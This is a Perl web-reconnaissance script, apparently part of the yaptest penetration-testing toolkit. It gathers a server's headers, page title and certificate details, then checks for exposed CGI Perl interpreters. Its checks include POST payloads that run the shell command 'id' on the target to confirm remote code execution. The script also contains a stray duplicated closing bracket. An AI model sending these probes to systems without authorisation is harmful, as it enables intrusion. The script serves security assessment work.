#!/usr/bin/env perl
use strict;
use warnings;

use MIME::Base64 qw(encode_base64 decode_base64);
use Data::Dumper;
use LWP::UserAgent;
use URI;
use HTTP::Request::Common qw(GET POST);
use HTTP::Request;
use HTTP::Cookies;

# Disable checking of SSL cert
$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;

my $ua = LWP::UserAgent->new;
my $usage = "$0 url

Gathers basic information about a website to parsing later by yaptest.

";

my $url_dirty = shift or die $usage;
my $uri_obj = URI->new($url_dirty);
my $ip = $uri_obj->host;
my $scheme = $uri_obj->scheme;
my $port = $uri_obj->port;
my $path_query = $uri_obj->path_query;
my $fragment = $uri_obj->fragment;
my $url = "$scheme://$ip:$port$path_query"; # including port makes parsing easier
my $req;
my $res;
# TODO consider adding php && shellshock?
my @checks = (
	{
		name => "windows_perl_minus_v",
		url => '/cgi-bin/perl.exe?-v',
		re  => 'Larry Wall',
		method => 'GET'
	},
	{
		name => "windows_perl_cmd_exec",
		url => '/cgi-bin/perl.exe',
		re  => 'uid=.*gid=',
		method => 'POST',
		body => "print \"Content-type: text/html\\n\\n\";\nprint \`id\`;"
	},
	{
		name => "unix_perl_minus_v",
		url => '/cgi-bin/perl?-v',
		re  => 'Larry Wall',
		method => 'GET'
	},
	{
		name => "unix_perl_cmd_exec",
		url => '/cgi-bin/perl',
		re  => 'uid=.*gid=',
		method => 'POST',
		body => "print \"Content-type: text/html\\n\\n\";\nprint \`id\`;"
	},
);
);

print "[+] Canonicalised URL: $url_dirty -> $url\n";

$ua->cookie_jar( HTTP::Cookies->new());
$ua->requests_redirectable([]); # Don't redirect.  Need to tamper with these.

my $new_url = $url;
my $redirects = 0;
my $keep_going = 1;
while ($keep_going and $redirects < 5) {
	$req = HTTP::Request->new(GET => $new_url);
	$res = $ua->request($req);
	if (($res->code eq "302" or $res->code eq "301") and $res->header("Location")) {
		my $loc = $res->header("Location");
		$loc =~ s!\.\./!/!g; # firefox, wget do this
		print "[D] ip: $ip\n";
		if ($loc =~ /^\//) {
			$new_url = "$scheme://$ip:$port/$loc";
			print "[+] Redirecting to $new_url\n";
			$redirects++;
		} elsif ($loc =~ m!^$scheme://$ip(:$port)?/!i) {
			$new_url = $loc;
			print "[+] Redirecting to $new_url\n";
			$redirects++;
		} else {
			print "[E] Not redirecting to $loc\n";
			print $res->as_string;
		}
		
	} else {
		$keep_going = 0;
	}
}

my ($title) = $res->as_string =~ m!<title>(.*?)</title>!;
my $ssl_subject = $res->header("Client-SSL-Cert-Subject");
my $ssl_issuer = $res->header("Client-SSL-Cert-Issuer");
my $http_server_header = $res->header("Server");
my $http_x_powered_by = $res->header("X-Powered_by");
my ($hp_system_management_version) = $res->content =~ /HP System Management Homepage v([\d\.]+)/;

output_info($url, "html_title", $title);
output_info($url, "ssl_subject", $ssl_subject);
output_info($url, "ssl_issuer", $ssl_issuer);
output_info($url, "http_server_header", $http_server_header);
output_info($url, "http_x_powered_by", $http_x_powered_by);
output_info($url, "homepage_url", $new_url);
output_info($url, "homepage_content_b64", $res->content);
output_info($url, "homepage_headers_b64", $res->headers->as_string);
if (defined($hp_system_management_version)) {
       output_info($url, "hp_system_management_version", $hp_system_management_version);
}

foreach my $check (@checks) {
	my $new_url = $url . $check->{url};
	my %body = ();
	if ($check->{method} eq "GET") {
		$req = HTTP::Request->new($check->{method} => $new_url, %body);
	}
	if ($check->{method} eq "POST") {
		if (defined($check->{body})) {
			$req = HTTP::Request->new("POST", $new_url, undef, $check->{body});
		} else {
			$req = HTTP::Request->new("POST", $new_url);
		}
	}
	$res = $ua->request($req);
	if ($res->as_string =~ /$check->{re}/) {
		printf "[I] Vulnerable\t%s\t%s\t%s\t%s\n", $check->{name}, $new_url, encode_base64($req->as_string, ""), encode_base64($res->as_string, "");
	} else {
		printf "[-] Not vulnerable\t%s\t%s\n", $check->{name}, $new_url;
	}
}

sub output_info {
	my ($url, $key, $value) = @_;

	if ($key =~ /b64$/) {
		$value = encode_base64($value, undef);
		chomp $value;
	}
	if ($value) {
		$value =~ s/[\r\n]/./g; # don't want multi-line
		print "[I]\t$url\t$key\t$value\n";
	}
}

